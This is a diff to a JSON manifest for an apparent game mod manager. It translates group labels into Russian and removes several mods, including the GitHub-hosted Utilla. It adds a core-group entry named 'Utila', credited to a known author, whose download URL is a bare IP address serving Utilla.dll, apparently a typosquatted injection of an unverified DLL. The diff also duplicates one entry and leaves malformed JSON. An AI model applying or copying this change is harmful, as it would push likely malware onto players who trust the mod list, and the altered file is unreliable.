@@ -4,8 +4,16 @@
     "author": "BepInEx Team",
     "version": "5.4.23.2",
     "git_path": "BepInEx/BepInEx",
-    "group": "Core",
+    "group": "Ядро",
     "download_url": "https://github.com/BepInEx/BepInEx/releases/download/v5.4.23.2/BepInEx_win_x64_5.4.23.2.zip"
+  },
+  {
+    "name": "Utila",
+    "author": "LegoAndMars",
+    "version": "5.4.23.2",
+    "git_path": "LegoAndMars/Utilla",
+    "group": "Ядро",
+    "download_url": "45.143.164.142:8000/Utilla.dll"
   },
   {
     "name": "Bepinject",
@@ -16,7 +24,7 @@
     ],
     "install_location": "BepInEx/plugins",
     "git_path": "Auros/Bepinject",
-    "group": "Libraries",
+    "group": "Библиотеки",
     "download_url": "https://github.com/Auros/Bepinject/releases/download/1.0.1/Bepinject-Auros.zip"
   },
   {
@@ -25,26 +33,15 @@
     "version": "1.0.1",
     "install_location": "BepInEx/plugins",
     "git_path": "Auros/Bepinject",
-    "group": "Libraries",
+    "group": "Библиотеки",
     "download_url": "https://github.com/Auros/Bepinject/releases/download/1.0.1/Extenject.zip"
-  },
-  {
-    "name": "GOOMPS",
-    "author": "buzzbb",
-    "version": "1.0.1",
-    "dependencies": [
-      "Utilla"
-    ],
-    "git_path": "BzzzThe18th/GOOMPS",
-    "group": "Tweaks / Tools",
-    "download_url": "https://github.com/BzzzThe18th/GOOMPS/releases/download/1.0.1/GOOMPS.dll"
   },
   {
     "name": "HoneyLib",
     "author": "buzzbb",
     "version": "1.1.0",
     "git_path": "BzzzThe18th/HoneyLib",
-    "group": "Libraries",
+    "group": "Библиотеки",
     "download_url": "https://github.com/BzzzThe18th/HoneyLib/releases/download/1.1.0/HoneyLib-v1.1.0.zip"
   },
   {
@@ -52,7 +49,7 @@
     "author": "James Newton-King",
     "version": "12.0.3",
     "git_path": "legoandmars/Newtonsoft.Json",
-    "group": "Libraries",
+    "group": "Библиотеки",
     "download_url": "https://github.com/legoandmars/Newtonsoft.Json/releases/download/12.0.3/Newtonsoft.Json-12.0.3.zip"
   },
   {
@@ -60,7 +57,7 @@
     "author": "ahauntedarmy",
     "version": "1.0.2",
     "git_path": "AHauntedArmy/TMPLoader",
-    "group": "Libraries",
+    "group": "Библиотеки",
     "download_url": "https://github.com/AHauntedArmy/TMPLoader/releases/download/1.0.2/TMPLoader-v1.0.2.zip"
   },
   {
@@ -71,45 +68,18 @@
       "Utilla"
     ],
     "git_path": "HuskyGT/TicTacToe",
-    "group": "Gameplay",
+    "group": "Геймплей",
     "download_url": "https://github.com/HuskyGT/TicTacToe/releases/download/1.0.2/TicTacToe.dll"
   },
   {
-    "name": "Utilla (BROKEN)",
-    "author": "bobbievr",
-    "version": "1.6.14",
-    "git_path": "legoandmars/Utilla",
-    "group": "Core",
-    "download_url": "https://github.com/legoandmars/Utilla/releases/download/v1.6.14/Utilla.zip"
-  },
-  {
-    "name": "YizziCamModV2",
-    "author": "Yizzii",
-    "version": "1.0.8",
-    "git_path": "Yizzii/YizziCamModV2",
-    "group": "Tweaks / Tools",
-    "download_url": "https://github.com/Yizzii/YizziCamModV2/releases/download/beta1.0.8/YizziCamModV2.dll"
-  },
-  {
-    "name": "Monke Dimensions",
-    "author": "Chin0303",
-    "version": "1.2.3",
+    "name": "Tic Tac Toe",
+    "author": "Husky",
+    "version": "1.0.2",
     "dependencies": [
       "Utilla"
     ],
-    "git_path": "Chin0303/Monke-Dimensions",
-    "group": "Gameplay",
-    "download_url": "https://github.com/Chin0303/Monke-Dimensions/releases/download/1.2.3/MonkeDimensions.1.2.3.Release.zip"
-  },
-  {
-    "name": "Legs",
-    "author": "SteveTheAnimator",
-    "version": "1.0.7",
-    "dependencies": [
-      "Utilla"
-    ],
-    "git_path": "SteveTheAnimator/Legs",
-    "group": "Cursed Mods",
-    "download_url": "https://github.com/SteveTheAnimator/Legs/releases/download/legnewyear/LegMod.dll"
+    "git_path": "HuskyGT/TicTacToe",
+    "group": "Геймплей",
+    "download_url": "https://github.com/HuskyGT/TicTacToe/releases/download/1.0.2/TicTacToe.dll"
   },
 ]
